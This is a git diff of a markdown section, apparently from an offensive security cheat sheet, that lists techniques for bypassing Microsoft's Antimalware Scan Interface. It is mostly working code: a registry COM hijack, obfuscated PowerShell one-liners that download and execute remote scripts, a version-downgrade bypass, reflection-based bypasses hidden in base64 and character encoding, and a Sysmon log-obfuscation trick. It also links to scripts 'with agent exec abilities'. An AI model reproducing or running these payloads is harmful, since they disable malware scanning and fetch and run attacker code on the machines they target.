@@ -2205,89 +2205,77 @@ CreateObject("WScript.Shell").Exec "cmd /b /R start /b /min Client.exe ip=192.16
 
 ## AMSI COM/REG Bypass
 
-      Microsoft’s Antimalware Scan Interface (AMSI) was introduced in Windows 10 as a standard interface
-      that provides the ability for AV engines to apply signatures to buffers both in memory and on disk.
-
-`HINT: Invoke-Expression powershell command flagging AMSI detection`<br />
+Microsoft’s Antimalware Scan Interface (AMSI) was introduced in Windows 10 as a standard interface<br />
+that provides the ability for AV engines to apply signatures to buffers both in memory and on disk.
 
 ---
 
 <br />
 
-- **AMSI** .COM Object DLL hijacking [ enigma0x3 ]
+### **AMSI** .COM Object DLL hijacking [ enigma0x3 ]
 
-      [ AMSI COM Bypass ] Since the COM server is resolved via the HKCU hive first, a normal user can hijack
-      the InProcServer32 key and register a non-existent DLL (or a malicious one if you like code execution).
-      In order to do this, there are two registry entries that need to be made:
+[ AMSI COM Bypass ] Since the COM server is resolved via the HKCU hive, a normal user can hijack the InProcServer32 key and<br />
+register a non-existent DLL (or a malicious one if you like code execution). In order to do this, two registry entries needs to be changed:
 
-<br />
+```cmd
+Windows Registry Editor Version 5.00
+[HKEY_CURRENT_USER\Software\Classes\CLSID\{fdb00e52-a214-4aa1-8fba-4357bb0072ec}]
+[HKEY_CURRENT_USER\Software\Classes\CLSID\{fdb00e52-a214-4aa1-8fba-4357bb0072ec}\InProcServer32]
+@="C:\\IDontExist.dll"
+```    
 
-      Windows Registry Editor Version 5.00
-      [HKEY_CURRENT_USER\Software\Classes\CLSID\{fdb00e52-a214-4aa1-8fba-4357bb0072ec}]
-      [HKEY_CURRENT_USER\Software\Classes\CLSID\{fdb00e52-a214-4aa1-8fba-4357bb0072ec}\InProcServer32]
-      @="C:\\IDontExist.dll"
-
-<br />
-
-      When AMSI attempts to starts its COM component, it will query its registered CLSID and return a
-      non-existent COM server. This causes a load failure and prevents any scanning methods from being
-      accessed, ultimately rendering AMSI useless. Now, when we try to run our “malicious” AMSI test sample,
-      you will notice that it is allowed to execute because AMSI is unable to access any of the scanning
-      methods via its COM interface:
-
-- **Being mean** .. [ one agent.bat with AMSI bypass abilities ;) ]<br />
-
-[DLL hijacking technic applied to AMSI-Bypass.bat with agent exec abilities](https://pastebin.com/H2kjLCin)<br />
+When AMSI attempts to starts its COM component, it will query its registered CLSID and return a
+non-existent COM server. This causes a load failure and prevents any scanning methods from being
+accessed, ultimately rendering AMSI useless. Now, when we try to run our “malicious” AMSI test sample,
+you will notice that it is allowed to execute because AMSI is unable to access any of the scanning
+methods via its COM interface: [DLL hijacking technic applied to AMSI-Bypass.bat with agent exec abilities](https://pastebin.com/H2kjLCin)<br />
 
 ---
 
 <br /> 
 
-- **AMSI** bypass using nul bits [Satoshi]
+### **AMSI** bypass using null bits [Satoshi]
 
-      Bypass AMSI mechanism using nul bits before the actual funtion occurs.
-      For file contents, insert "#<NULL>" at the beginning of the file, and any places
-      where additional scans with AMSI occur. For command line contents, wrap them into
-      Invoke-Expression and prepend 'if(0){{{0}}}' -f $(0 -as [char]) +'
+Bypass AMSI mechanism using null bits before the actual funtion occurs. For file contents, insert "#<NULL>" at the beginning of the file and<br />
+any places where additional scans with AMSI occur. For command line contents prepend `'if(0){{{0}}}' -f $(0 -as [char]) +'`
 
 <br />
 
-- For **command line** contents<br />
+For **command line** contents<br />
+	
+```powershell	
+powershell IEX ('if(0){{{0}}}' -f $(0 -as [char]) + New-Object Ne'+'t.WebC'+'lient').DownloadString('ht'+'tp:/'+'/'+'19'+'2.168.1.7'+'1/Invoke-Hello.ps1')
+```
 
-       powershell IEX ('if(0){{{0}}}' -f $(0 -as [char]) + New-Object Ne'+'t.WebC'+'lient').DownloadString('ht'+'tp:/'+'/'+'19'+'2.168.1.7'+'1/Invoke-Hello.ps1')
-
-- OR (using [#NULL] before the monitorized syscall)
-
-      powershell Write-Host "#<NULL>"; I`E`X ('({0}w-Object {0}t.WebC{3}nt).{1}String("{2}19`2.168.1.71/hello.ps1")' -f'Ne','Download','http://','lie')
-
-- For file contents<br />
+OR (using [#NULL] before the monitorized syscall)
+	
+```powershell	
+powershell Write-Host "#<NULL>"; I`E`X ('({0}w-Object {0}t.WebC{3}nt).{1}String("{2}19`2.168.1.71/hello.ps1")' -f'Ne','Download','http://','lie')
+```
 
 ---
-
-- Bypass or Avoid AMSI by **version Downgrade** <br />
-
-      Force it to use PowerShell v2: PowerShell v2 doesn't support AMSI at the time of writing.
-      If .Net 3.0 is available on a target Windows 10 machine (which is not default) PowerShell
-      v2 can be started  with the -Version option.
-
+	
 <br />
 
-- Oneliner AMSI bypass<br />
+### Bypass or Avoid AMSI by **version Downgrade** <br />
 
-      powershell.exe -version 2 IEX (New-Object Net.WebClient).DownloadString('ht'+'tp:'+'//19'+'2.16'+'8.1.71/hello.ps1')
+Force it to use PowerShell v2: PowerShell v2 doesn't support AMSI at the time of writing. If .Net 3.0 is available on a target Windows 10<br />
+machine (which is not default) PowerShell v2 can be started  with the -Version 2 option.
+
+```powershell
+powershell.exe -version 2 IEX (New-Object Net.WebClient).DownloadString('ht'+'tp:'+'//19'+'2.16'+'8.1.71/hello.ps1')
+```
       
 [AMSI Downgrade check applied to AMSI-Downgrade.ps1 (just check if vuln its present)](https://pastebin.com/qkkq5bZy)<br />
 
 ---
-
-- Reflection - Matt Graeber's method<br />
-
-      Matt Graeber (@mattifestation) tweeted an awesome one line AMSI bypass. Like many other things by
-      Matt, this is my favorite. It doesn't need elevated shell and there is no notification to the user.
-
+	
 <br />
 
-[@mattifestation reflection technic applied to AMSI-Reflection.ps1 with Bypass/download/exec abilities](https://pastebin.com/THJQvHnU)<br />
+### Reflection - Matt Graeber's method<br />
+
+Matt Graeber (@mattifestation) tweeted an awesome one line AMSI bypass. Like many other things by Matt,<br />
+this is my favorite. It doesn't need elevated shell and there is no notification to the user.
 
 ```powershell
 [Ref].Assembly.GetType('System.Management.Automation.'+$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QQBtAHMAaQBVAHQAaQBsAHMA')))).GetField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('YQBtAHMAaQBJAG4AaQB0AEYAYQBpAGwAZQBkAA=='))),'NonPublic,Static').SetValue($null,$true)
@@ -2296,19 +2284,24 @@ $fwi=[System.Runtime.InteropServices.Marshal]::AllocHGlobal((9076+8092-8092));[R
 
 [SySTEm.tExt.eNcODinG]::uNiCOde.gEtsTRING([sYsTeM.coNverT]::FRomBaSe64StRINg("IwBVAG4AawBuAG8AdwBuACAALQAgAEYAbwByAGMAZQAgAGUAcgByAG8AcgAgAAoAJABmAHQAdgB1AGMAdgB4AD0AWwBTAHkAcwB0AGUAbQAuAFIAdQBuAHQAaQBtAGUALgBJAG4AdABlAHIAbwBwAFMAZQByAHYAaQBjAGUAcwAuAE0AYQByAHMAaABhAGwAXQA6ADoAQQBsAGwAbwBjAEgARwBsAG8AYgBhAGwAKAAoADkAMAA3ADYAKQApADsAWwBSAGUAZgBdAC4AQQBzAHMAZQBtAGIAbAB5AC4ARwBlAHQAVAB5AHAAZQAoACIAJAAoAFsAQwBoAGEAcgBdACgAWwBiAHkAdABlAF0AMAB4ADUAMwApACsAWwBjAGgAQQBSAF0AKABbAGIAeQBUAEUAXQAwAHgANwA5ACkAKwBbAGMAaABhAHIAXQAoADQAMQArADcANAApACsAWwBDAEgAQQByAF0AKABbAEIAeQBUAGUAXQAwAHgANwA0ACkAKwBbAEMAaABBAHIAXQAoAFsAYgBZAHQARQBdADAAeAA2ADUAKQArAFsAQwBoAEEAcgBdACgAMQAwADkAKwA4ADEALQA4ADEAKQArAFsAYwBoAGEAcgBdACgAWwBiAHkAVABlAF0AMAB4ADIAZQApACsAWwBjAGgAQQByAF0AKAA3ADcAKwAyADYALQAyADYAKQArAFsAYwBIAGEAUgBdACgAMwAzACsANgA0ACkAKwBbAGMASABBAHIAXQAoAFsAQgBZAFQARQBdADAAeAA2AGUAKQArAFsAQwBoAGEAUgBdACgANgA3ACsAMwAwACkAKwBbAEMASABBAFIAXQAoADEAMAAzACsANAA3AC0ANAA3ACkAKwBbAEMAaABBAFIAXQAoADcAOQArADIAMgApACsAWwBjAEgAQQBSAF0AKAAxADAAOQApACsAWwBjAGgAQQBSAF0AKABbAGIAWQB0AEUAXQAwAHgANgA1ACkAKwBbAEMAaABBAHIAXQAoADEAMAAwACsAMQAwACkAKwBbAEMAaABhAHIAXQAoAFsAQgB5AFQAZQBdADAAeAA3ADQAKQApAC4AQQB1AHQAbwBtAGEAdABpAG8AbgAuACQAKABbAEMAaABBAFIAXQAoAFsAQgB5AFQARQBdADAAeAA0ADEAKQArAFsAYwBoAGEAcgBdACgAWwBiAFkAdABlAF0AMAB4ADYAZAApACsAWwBjAGgAQQByAF0AKAAxADEANQArADMANAAtADMANAApACsAWwBjAEgAYQByAF0AKAAxADAANQApACsAWwBjAEgAYQByAF0AKABbAGIAWQB0AGUAXQAwAHgANQA1ACkAKwBbAEMASABhAHIAXQAoAFsAYgBZAHQAZQBdADAAeAA3ADQAKQArAFsAYwBoAEEAcgBdACgAWwBCAHkAVABlAF0AMAB4ADYAOQApACsAWwBDAEgAYQByAF0AKABbAGIAWQBUAGUAXQAwAHgANgBjACkAKwBbAGMAaABBAFIAXQAoADEAMQA1ACsANgA0AC0ANgA0ACkAKQAiACkALgBHAGUAdABGAGkAZQBsAGQAKAAiACQAKAAnAOQAbQBzAO0AUwBlAHMAcwDtAPQAbgAnAC4ATgBPAFIAbQBBAGwAaQBaAEUAKABbAEMAaABhAFIAXQAoADcAMAApACsAWwBjAEgAYQByAF0AKAAxADEAMQAqADMAMQAvADMAMQApACsAWwBjAGgAYQBSAF0AKAAxADEANAAqADQAOAAvADQAOAApACsAWwBDAGgAYQBSAF0AKABbAGIAeQBUAEUAXQAwAHgANgBkACkAKwBbAGMAaABhAFIAXQAoADYAOAApACkAIAAtAHIAZQBwAGwAYQBjAGUAIABbAGMAaABhAFIAXQAoAFsAYgBZAFQAZQBdADAAeAA1AGMAKQArAFsAYwBIAEEAcgBdACgAOAAxACsAMwAxACkAKwBbAEMASABhAHIAXQAoAFsAQgBZAFQAZQBdADAAeAA3AGIAKQArAFsAQwBoAGEAUgBdACgAWwBiAHkAdABFAF0AMAB4ADQAZAApACsAWwBDAGgAQQBSAF0AKABbAGIAWQB0AEUAXQAwAHgANgBlACkAKwBbAEMASABhAFIAXQAoAFsAQgBZAHQAZQBdADAAeAA3AGQAKQApACIALAAgACIATgBvAG4AUAB1AGIAbABpAGMALABTAHQAYQB0AGkAYwAiACkALgBTAGUAdABWAGEAbAB1AGUAKAAkAG4AdQBsAGwALAAgACQAbgB1AGwAbAApADsAWwBSAGUAZgBdAC4AQQBzAHMAZQBtAGIAbAB5AC4ARwBlAHQAVAB5AHAAZQAoACIAJAAoAFsAQwBoAGEAcgBdACgAWwBiAHkAdABlAF0AMAB4ADUAMwApACsAWwBjAGgAQQBSAF0AKABbAGIAeQBUAEUAXQAwAHgANwA5ACkAKwBbAGMAaABhAHIAXQAoADQAMQArADcANAApACsAWwBDAEgAQQByAF0AKABbAEIAeQBUAGUAXQAwAHgANwA0ACkAKwBbAEMAaABBAHIAXQAoAFsAYgBZAHQARQBdADAAeAA2ADUAKQArAFsAQwBoAEEAcgBdACgAMQAwADkAKwA4ADEALQA4ADEAKQArAFsAYwBoAGEAcgBdACgAWwBiAHkAVABlAF0AMAB4ADIAZQApACsAWwBjAGgAQQByAF0AKAA3ADcAKwAyADYALQAyADYAKQArAFsAYwBIAGEAUgBdACgAMwAzACsANgA0ACkAKwBbAGMASABBAHIAXQAoAFsAQgBZAFQARQBdADAAeAA2AGUAKQArAFsAQwBoAGEAUgBdACgANgA3ACsAMwAwACkAKwBbAEMASABBAFIAXQAoADEAMAAzACsANAA3AC0ANAA3ACkAKwBbAEMAaABBAFIAXQAoADcAOQArADIAMgApACsAWwBjAEgAQQBSAF0AKAAxADAAOQApACsAWwBjAGgAQQBSAF0AKABbAGIAWQB0AEUAXQAwAHgANgA1ACkAKwBbAEMAaABBAHIAXQAoADEAMAAwACsAMQAwACkAKwBbAEMAaABhAHIAXQAoAFsAQgB5AFQAZQBdADAAeAA3ADQAKQApAC4AQQB1AHQAbwBtAGEAdABpAG8AbgAuACQAKABbAEMAaABBAFIAXQAoAFsAQgB5AFQARQBdADAAeAA0ADEAKQArAFsAYwBoAGEAcgBdACgAWwBiAFkAdABlAF0AMAB4ADYAZAApACsAWwBjAGgAQQByAF0AKAAxADEANQArADMANAAtADMANAApACsAWwBjAEgAYQByAF0AKAAxADAANQApACsAWwBjAEgAYQByAF0AKABbAGIAWQB0AGUAXQAwAHgANQA1ACkAKwBbAEMASABhAHIAXQAoAFsAYgBZAHQAZQBdADAAeAA3ADQAKQArAFsAYwBoAEEAcgBdACgAWwBCAHkAVABlAF0AMAB4ADYAOQApACsAWwBDAEgAYQByAF0AKABbAGIAWQBUAGUAXQAwAHgANgBjACkAKwBbAGMAaABBAFIAXQAoADEAMQA1ACsANgA0AC0ANgA0ACkAKQAiACkALgBHAGUAdABGAGkAZQBsAGQAKAAiACQAKAAnAOMAbQBzAO0AQwD0AG4AdABlAHgAdAAnAC4AbgBvAFIAbQBBAEwAaQBaAEUAKABbAEMAaABhAHIAXQAoADUAKwA2ADUAKQArAFsAYwBoAEEAcgBdACgAMQAxADEAKgA1ADQALwA1ADQAKQArAFsAYwBIAGEAUgBdACgAOQA2ACsAMQA4ACkAKwBbAGMAaABhAFIAXQAoADEAMAA5ACsAMQAtADEAKQArAFsAQwBoAEEAcgBdACgAWwBiAHkAVABFAF0AMAB4ADQANAApACkAIAAtAHIAZQBwAGwAYQBjAGUAIABbAGMAaABBAHIAXQAoAFsAQgB5AFQAZQBdADAAeAA1AGMAKQArAFsAQwBIAEEAcgBdACgAWwBCAFkAdABlAF0AMAB4ADcAMAApACsAWwBDAEgAQQByAF0AKABbAGIAWQB0AEUAXQAwAHgANwBiACkAKwBbAEMASABhAFIAXQAoADcANwArADUAOQAtADUAOQApACsAWwBDAEgAYQByAF0AKABbAGIAeQB0AGUAXQAwAHgANgBlACkAKwBbAEMASABhAFIAXQAoADEAMgA1ACkAKQAiACwAIAAiAE4AbwBuAFAAdQBiAGwAaQBjACwAUwB0AGEAdABpAGMAIgApAC4AUwBlAHQAVgBhAGwAdQBlACgAJABuAHUAbABsACwAIABbAEkAbgB0AFAAdAByAF0AJABmAHQAdgB1AGMAdgB4ACkAOwA="))|iex
 
+$pacinojz=[System.Runtime.InteropServices.Marshal]::AllocHGlobal((9076*5049/5049));[Ref].Assembly.GetType("$([char](83)+[chAR]([byTE]0x79)+[cHaR](74+41)+[CHar](55+61)+[cHAr]([bYte]0x65)+[CHar](109+88-88)+[cHAr](46)+[cHAR]([BYtE]0x4d)+[CHAR]([BYtE]0x61)+[ChAr](110)+[Char]([BYTe]0x61)+[cHAR](103+19-19)+[cHAR](101)+[cHaR]([BYte]0x6d)+[ChAr]([ByTE]0x65)+[chAr]([BYte]0x6e)+[CHaR]([Byte]0x74)).Automation.$('ÄmsîUtîls'.NoRmaLize([cHAr]([ByTe]0x46)+[cHar](41+70)+[cHar]([bYTe]0x72)+[CHar](109)+[chAR]([BYtE]0x44)) -replace [ChaR](66+26)+[CHar](112+32-32)+[chAr]([ByTE]0x7b)+[chAr](77+60-60)+[chaR](110)+[cHAr](125*8/8))").GetField("$([cHAr](66+31)+[chAR](109)+[chaR]([BYte]0x73)+[ChAR]([BYtE]0x69)+[CHar](83+15-15)+[Char](101)+[cHAR](115*34/34)+[CHAr](106+9)+[CHaR]([BytE]0x69)+[ChAR](111)+[cHaR]([byte]0x6e))", "NonPublic,Static").SetValue($null, $null);[Ref].Assembly.GetType("$([char](83)+[chAR]([byTE]0x79)+[cHaR](74+41)+[CHar](55+61)+[cHAr]([bYte]0x65)+[CHar](109+88-88)+[cHAr](46)+[cHAR]([BYtE]0x4d)+[CHAR]([BYtE]0x61)+[ChAr](110)+[Char]([BYTe]0x61)+[cHAR](103+19-19)+[cHAR](101)+[cHaR]([BYte]0x6d)+[ChAr]([ByTE]0x65)+[chAr]([BYte]0x6e)+[CHaR]([Byte]0x74)).Automation.$('ÄmsîUtîls'.NoRmaLize([cHAr]([ByTe]0x46)+[cHar](41+70)+[cHar]([bYTe]0x72)+[CHar](109)+[chAR]([BYtE]0x44)) -replace [ChaR](66+26)+[CHar](112+32-32)+[chAr]([ByTE]0x7b)+[chAr](77+60-60)+[chaR](110)+[cHAr](125*8/8))").GetField("$([ChAR](97*35/35)+[ChAR](109*69/69)+[cHar]([Byte]0x73)+[Char]([byTE]0x69)+[ChAr]([bYte]0x43)+[chAR]([BYtE]0x6f)+[ChaR](27+83)+[chAR](116+57-57)+[cHaR](101)+[char](87+33)+[CHAr](116))", "NonPublic,Static").SetValue($null, [IntPtr]$pacinojz);
+
 ```
+	
+[@mattifestation reflection technic applied to AMSI-Reflection.ps1 with Bypass/download/exec abilities](https://pastebin.com/THJQvHnU)<br />
 
 ---
+	
+<br />	
 
-- @danielbohannon **escaping percent** signs bug (EventVwr.exe)
+### @danielbohannon **escaping percent** signs bug (EventVwr.exe)
 
-      Daniel Bohannon disclosure a few days ago (19 march 2018) one AMSI obfuscation technic that
-      relays on an escaping bug with percent signs in Sysmon EID 1's CommandLine field that is
-      rendering incorrect data when viewed with EventVwr.exe.
+Daniel Bohannon disclosure a few days ago (19 march 2018) one AMSI obfuscation technic that relays on an escaping bug<br />
+with percent signs in Sysmon EID 1's CommandLine field that is rendering incorrect data when viewed with EventVwr.exe.
 
-<br />
-
-      cmd.exe /c "echo PUT_EVIL_COMMANDS_HERE||%1%1%1%1%1%1%1%1%1%1%1%1%1%1%1%1%1%1%1%1%1%1%1%1%1%1%1%1%1%1%1%1%1%1%1%1%1%1%1%1%1%1%1%1%1%1%1%1%1%1"
+```cmd
+cmd.exe /c "echo PUT_EVIL_COMMANDS_HERE||%1%1%1%1%1%1%1%1%1%1%1%1%1%1%1%1%1%1%1%1%1%1%1%1%1%1%1%1%1%1%1%1%1%1%1%1%1%1%1%1%1%1%1%1%1%1%1%1%1%1"
+```
 
 ---
 
